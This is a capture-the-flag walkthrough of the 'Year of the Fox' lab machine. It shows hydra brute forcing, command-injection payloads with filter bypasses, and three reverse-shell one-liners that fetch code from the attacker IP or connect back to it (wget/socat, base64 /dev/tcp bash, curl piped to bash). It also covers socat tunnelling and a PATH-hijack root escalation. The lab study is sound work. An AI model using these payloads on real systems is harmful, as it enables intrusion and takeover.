<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>year of the fox</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>year of the fox</h1><br/><p><strong><h1>Year of the Fox</h1></strong></p><p></p><p></p><p><strong><h2>Enumeration</h2></strong></p><p></p><p><strong>Rustscan for Open Ports:</strong></p><p><img src="images/50-1.png" alt="images/50-1.png" /></p><p></p><p><strong>Nmap with Specific Ports:</strong></p><p><img src="images/50-2.png" alt="images/50-2.png" /></p><p></p><p>At this point, we see there are 3 open ports. Generally speaking we have 2 ways to access the machine <strong>Samba</strong> &amp; <strong>Webserver</strong>.</p><p></p><p><strong>Webserver Enumeration:</strong></p><p><img src="images/50-3.png" alt="images/50-3.png" /></p><p></p><p>When I opened the website, it asks for credentials. I checked the request in burpsuite. We have a simple <strong>GET</strong> request in the begining.</p><p><img src="images/50-4.png" alt="images/50-4.png" /></p><p></p><p>Once I forward this, we are presented with the Login Page. This is a <strong>header based form</strong> which uses <strong>GET</strong> request. When I entered username as <strong>admin</strong> &amp; password as <strong>password</strong> as a dummy request. The following is the request. </p><p></p><p><strong>Note:</strong> It uses Basic Authorization that converts the username &amp; password to base64.</p><p></p><p><img src="images/50-5.png" alt="images/50-5.png" /></p><p></p><p>This is a <strong>header based form</strong> which uses <strong>GET</strong> request.</p><p>We can decode the Base64 string to be sure.</p><p></p><p><img src="images/50-6.png" alt="images/50-6.png" /></p><p></p><p>This base64 string must be verified in the server side. Currently we do not have any credentials. So lets continue our enumeration.</p><p></p><p><strong>Samba Enumeration:</strong></p><p></p><p><span style="text-decoration:underline;">smbclient:</span></p><p></p><p><img src="images/50-7.png" alt="images/50-7.png" /></p><p></p><p>I enumerated to list the samba shares. I found an intresting share called <strong>yotf</strong>. However, its not accessible without any credentials.</p><p>I checked guest Login was also disabled.</p><p>I will use <strong>enum4linux</strong> to get maximum information about the system from the samba share.</p><p></p><p><span style="text-decoration:underline;">enum4linux:</span></p><p><img src="images/50-8.png" alt="images/50-8.png" /></p><p></p><p><img src="images/50-9.png" alt="images/50-9.png" /></p><p></p><p>As we can see above, we found 2 users.</p><p></p><p><strong>Users Found:</strong></p><p><em>fox</em></p><p><em>rascal</em></p><p></p><p></p><p>After checking each avenue, we conclude that at this point, the CTF needs brute force. We can either choose to <strong>Brute force</strong> the <strong>Website</strong> or the <strong>Samba share</strong> with the known users above.</p><p><strong>Note:</strong> I tried various things, and finally we found a way by brute forcing the website with the user rascal.</p><p></p><p><strong>Website Brute forcing:</strong></p><p>Link:<strong> </strong><strong><a href="https://github.com/gnebbia/hydra_notes">https://github.com/gnebbia/hydra_notes</a></strong></p><p>I will use hydra to brute force http-get request. We can use any of the following syntax.</p><p></p><p><strong>hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.230.171 http-get</strong></p><p><strong>hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.230.171 http-get /</strong></p><p><strong>hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.230.171 http-head</strong></p><p><strong>hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.230.171 http-head /</strong></p><p></p><p><img src="images/50-10.png" alt="images/50-10.png" /></p><p></p><p><strong>Credentials Found:</strong></p><p><em>Username: 	rascal</em></p><p><em>Password: 	hello2u</em></p><p></p><p></p><p><strong>Website Enumeration Contd:</strong></p><p>I used the above credentials and continued the website enumeration.</p><p><img src="images/50-11.png" alt="images/50-11.png" /></p><p></p><p>We landed on a page called <strong>Rascal&#39;s Search System</strong>. I clicked on search without any arguments.</p><p><img src="images/50-12.png" alt="images/50-12.png" /></p><p></p><p>We could see some files. I also noticed there is a <strong>Client Side Filter</strong> in place that prevents certain keyboard entries like / &amp; any special charecters.</p><p>We should be able to bypass the <strong>Client Side Filter</strong> by using <strong>burpsuite</strong> and capturing the request in the <strong>repeater</strong>.</p><p></p><p><strong>Burpsuite Website Analysis:</strong></p><p>I entered a dummy search ‘abcdef’ and captured the request in Burpsuite.</p><p><img src="images/50-13.png" alt="images/50-13.png" /></p><p></p><p>Lets send this to <strong>repeater</strong> and continue our analysis.</p><p></p><p><img src="images/50-14.png" alt="images/50-14.png" /></p><p></p><p>After researching a lot I found that the following payloads were working for command injection. However, we won&#39;t get the output on the webpage (For the 1st Payload) so we will use ping command and verify with wireshark/tcpdump.</p><p></p><p>The 2nd Payload: Shows output on the webpage.</p><p></p><p><span style="text-decoration:underline;">Payload 1:</span><strong> \&quot;;pwd \&quot;</strong></p><p><span style="text-decoration:underline;">Payload 2:</span> <strong>\&quot;;pwd\n</strong></p><p></p><p><strong>Note:</strong> Both the payloads have to be inserted inside the  <strong>double quotes</strong>: “abcdef&quot;.</p><p>Replace abcdef with our payload</p><p></p><p><strong>Payload 2:</strong></p><p>Using Payload 2 we can see the result in the website. So I will use the <strong>pwd</strong> command.</p><p></p><p><strong>{</strong></p><p><strong>&quot;target&quot;:&quot;\&quot;;pwd\n&quot;</strong></p><p><strong>}</strong></p><p></p><p><img src="images/50-15.png" alt="images/50-15.png" /></p><p></p><p><strong>Payload 1:</strong></p><p>Using Payload 1 as we cannot see the results in the webpage. I will use <strong>ping</strong> command and <strong>tcpdump</strong>.</p><p></p><p><strong>{</strong></p><p><strong>&quot;target&quot;:&quot;\&quot;;ping -c 1 10.11.72.31;\&quot;&quot;</strong></p><p><strong>}</strong></p><p></p><p><img src="images/50-16.png" alt="images/50-16.png" /></p><p></p><p>Verified that Ping from the target is reaching us.</p><p><strong>tcpdump ip proto \\icmp -i tun0</strong></p><p><img src="images/50-17.png" alt="images/50-17.png" /></p><p></p><p>Therefore, we have successfully achieved RCE (Remote Command Execution) on the target machine.</p><p></p><p><strong><h2>Foothold</h2></strong></p><p></p><p>From here, we should easily be able to get a reverse shell connection from the target machine using our RCE exploit. </p><p>However, I faced another problem. There is a <strong>Server Side Filter</strong> that prevents certain keys like <strong>$</strong>..etc</p><p></p><p>I tried <strong>bash reverse shell</strong>, <strong>nc reverse shell</strong>.</p><p>Both of them didn&#39;t work.</p><p></p><p><strong>Working Solutions(3):</strong></p><p><span style="text-decoration:underline;">Solution-1</span>: We can host a local <strong>socat</strong> binary in<strong> local webserver</strong> and <strong>get</strong> it <strong>to</strong> the <strong>machine</strong> and run it to create a <strong>socat reverse shell</strong>.</p><p></p><p><strong>Latest Version - 1.7.4.3</strong></p><p><strong><a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat">https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat</a></strong> <strong>(Version - 1.7.3.0)</strong></p><p><strong><a href="https://github.com/3ndG4me/socat/releases">https://github.com/3ndG4me/socat/releases</a></strong> <strong>(Version - 1.7.3.3)</strong></p><p><strong></strong></p><p><strong></strong><strong><span style="text-decoration:underline;">Important Note:</span></strong><strong> </strong>The Latest version of Socat requires <strong>libssl.so.3 </strong>library file to run. However, the file is not present in the target machine. I have cheked. Thus, we need to use an <strong>older</strong> <strong>version</strong> of <strong>socat</strong> for this CTF.</p><p></p><p>Any one from the above links will work.<strong></strong></p><p><strong></strong></p><p><img src="images/50-18.png" alt="images/50-18.png" /></p><p></p><p>{</p><p><strong>&quot;target&quot;:&quot;\&quot;; wget -q </strong><strong><a href="http://10.11.72.31/socat">http://10.11.72.31/socat</a></strong><strong> -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:&#39;bash -li&#39;,pty,stderr,sigint,setsid,sane tcp:10.11.72.31:5555; \n&quot;</strong></p><p>}</p><p></p><p><img src="images/50-19.png" alt="images/50-19.png" /></p><p></p><p></p><p><span style="text-decoration:underline;">Solution-</span>2: We can <strong>encode</strong> the above not working <strong>bash/nc reverse shell</strong> in <strong>base64</strong> and <strong>decode</strong> them in <strong>server side</strong> then pipe to <strong>bash</strong>.</p><p></p><p>I encoded the bash reverse shell: <strong>/bin/bash -i &gt;&amp; /dev/tcp/10.11.72.31/6666 0&gt;&amp;1</strong></p><p><img src="images/50-20.png" alt="images/50-20.png" /></p><p></p><p></p><p><strong>{</strong></p><p><strong>&quot;target&quot;:&quot;\&quot;; echo &#39;L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjExLjcyLjMxLzY2NjYgMD4mMQ==&#39; | base64 -d | bash \n&quot;</strong></p><p><strong>}</strong></p><p></p><p><img src="images/50-21.png" alt="images/50-21.png" /></p><p></p><p><span style="text-decoration:underline;">Solution-</span>3: We can use a <strong>shell script</strong> having <strong>bash reverse shell</strong> hosted in <strong>local webserver</strong> and <strong>get</strong> it <strong>to</strong> the <strong>machine</strong> and <strong>run</strong> the <strong>script</strong>.</p><p></p><p><img src="images/50-22.png" alt="images/50-22.png" /></p><p></p><p><strong>{</strong></p><p><strong>&quot;target&quot;:&quot;\&quot;; curl </strong><strong><a href="http://10.11.72.31/rev.sh">http://10.11.72.31/rev.sh</a></strong><strong> | bash \n&quot;</strong></p><p><strong>}</strong></p><p></p><p><img src="images/50-23.png" alt="images/50-23.png" /></p><p></p><p></p><p>We then find the web flag in the following directory.</p><p><img src="images/50-24.png" alt="images/50-24.png" /></p><p></p><p><strong><h2>Privilege Escalation</h2></strong></p><p></p><p>Running the <strong>netstat</strong> command gives us an intresting result.</p><p></p><p><img src="images/50-25.png" alt="images/50-25.png" /></p><p></p><p><strong>SSH</strong> is running on the machine on port 22. However, it is only accessible to <strong>localhost</strong>(127.0.0.1).</p><p>Any external communication to port 22 is thus blocked by the firewall.</p><p></p><p>Here we will use <strong>Socat</strong> to <strong>Tunnel</strong> the <strong>localhost:22</strong> to a different selected <strong>unsed port</strong> on the machine say <strong>9090</strong>.</p><p>Once the Tunnel is successful, attacker can connect to port <strong>9090</strong> --→ which will be tunneled to <strong>localhost:22</strong>. </p><p>Thus access the<strong> SSH server </strong>on port <strong>9090</strong>.</p><p></p><p><strong><h3>Socat Tunnelling:</h3></strong></p><p>I will use the socat binary i uploaded in the Foothold process. (<strong>Solution-1</strong>).</p><p></p><p><strong>socat tcp-listen:9090,reuseaddr,fork tcp:localhost:22</strong></p><p></p><p><img src="images/50-26.png" alt="images/50-26.png" /></p><p></p><p>Now From my machine we test if the tunneling was successful.</p><p>I used <strong>Nmap</strong> scan to test.</p><p></p><p><img src="images/50-27.png" alt="images/50-27.png" /></p><p></p><p>As we can see, our tunneling was successful.</p><p></p><p>Next, I look the following file to know about SSH users.</p><p><strong>/etc/ssh/sshd_config</strong></p><p></p><p><strong>more /etc/ssh/sshd_config</strong></p><p><img src="images/50-28.png" alt="images/50-28.png" /></p><p></p><p></p><p>Next I <strong>brute force</strong> the <strong>SSH</strong> user <strong>fox</strong> with <strong>hydra</strong></p><p></p><p><strong>SSH Brute forcing:</strong></p><p>The following hydra command is used.</p><p></p><p><strong>hydra -l fox -P /usr/share/wordlists/rockyou.txt -s 9090 10.10.35.159 ssh</strong></p><p></p><p><img src="images/50-29.png" alt="images/50-29.png" /></p><p></p><p>Thus, we found a SSH credential.</p><p></p><p><strong>SSH Credentials Found</strong></p><p>Username:	<strong>fox</strong></p><p>Password:	<strong>ginger</strong></p><p></p><p></p><p><strong><h3>Lateral Movement-1:</h3></strong></p><p>We login into fox user using the SSH tunnel.</p><p></p><p><strong>ssh fox@10.10.35.159 -p 9090</strong></p><p></p><p><img src="images/50-30.png" alt="images/50-30.png" /></p><p></p><p>Next, we get the user flag in the home directory.</p><p><img src="images/50-31.png" alt="images/50-31.png" /></p><p></p><p>Lets check sudo on the Target Machine:</p><p><img src="images/50-32.png" alt="images/50-32.png" /></p><p></p><p>Normal Sudo</p><p><img src="images/50-33.png" alt="images/50-33.png" /></p><p></p><p>As we can see, the <strong>secure_path</strong> is not present on the target machine. This means if any executible uses any program without absolute path. We can use this to plant our program in a different path.</p><p></p><p>Lets examine the <strong>/usr/sbin/shutdown</strong> binary by taking it to kali machine.</p><p></p><p><span style="text-decoration:underline;">Target Machine</span>: <strong>cp /usr/sbin/shutdown /tmp</strong></p><p><span style="text-decoration:underline;">Attacker Machine</span>: <strong>scp -P 9090 fox@10.10.93.57:/tmp/shutdown .</strong></p><p></p><p><strong><span style="text-decoration:underline;">Examine the Shutdown Binary using radare2:</span></strong></p><p></p><p><strong>radare2 -AAA &lt;Filename&gt;</strong></p><p><strong>pdf @main</strong></p><p></p><p><img src="images/50-34.png" alt="images/50-34.png" /></p><p></p><p>As we can see, the <strong>poweroff</strong> is called <strong>without absoulute path</strong>.</p><p>We need to copy the <strong>/bin/bash</strong> binary to <strong>/tmp</strong> and rename as <strong>poweroff</strong> and <strong>add the /tmp path</strong> while calling the <strong>shutdown using sudo</strong>.</p><p></p><p><strong>cp /bin/bash /tmp/poweroff</strong></p><p></p><p>Then run the sudo command along with PATH as follows:</p><p></p><p><strong>sudo &quot;PATH=/tmp:$PATH&quot; /usr/sbin/shutdown</strong></p><p></p><p><img src="images/50-35.png" alt="images/50-35.png" /></p><p></p><p>Thus, we have root access &amp; can get the root flag.</p><p></p><p><img src="images/50-36.png" alt="images/50-36.png" /></p><p></p><p>I searched for root flag in the /root directory but it contained a text <strong>“Not here -- go find!”</strong></p><p>Thus I used a <strong>find</strong> command to try locate the flag.</p><p></p><p><strong>find / -type f -name &quot;*flag*&quot; 2&gt;/dev/null</strong></p><p></p><p>But it didn&#39;t find any result.</p><p>Finally I used the followng find command to get the flag.</p><p></p><p><strong>find / -type f -name &quot;*root*&quot; 2&gt;/dev/null</strong></p><p></p><p><img src="images/50-37.png" alt="images/50-37.png" /></p><p></p><p>Thus,we get the root flag.</p><p><img src="images/50-38.png" alt="images/50-38.png" /></p><p></p><p>Thanks!!</p></div>
</body>
</html>
